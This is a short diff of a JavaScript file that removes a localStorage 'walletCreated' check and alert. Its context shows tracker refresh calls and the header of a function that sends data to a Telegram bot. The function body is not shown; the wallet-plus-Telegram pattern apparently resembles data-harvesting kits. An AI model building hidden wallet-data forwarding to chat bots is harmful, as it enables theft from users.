@@ -67,16 +67,7 @@ document.addEventListener('DOMContentLoaded', () => {
     refreshTracker('tracker1');
     refreshTracker('tracker-one');
     // Add more if needed
-});
-
-//Yest
-const walletCreated = localStorage.getItem('walletCreated');
-if (walletCreated === 'true') {
-alert('Wallet created');
-startTracker('tracker-one');
-}
-
-		    
+});		    
 
 // Function to send data to Telegram bot
 async function sendToTelegramBot(data, botToken, chatId) {
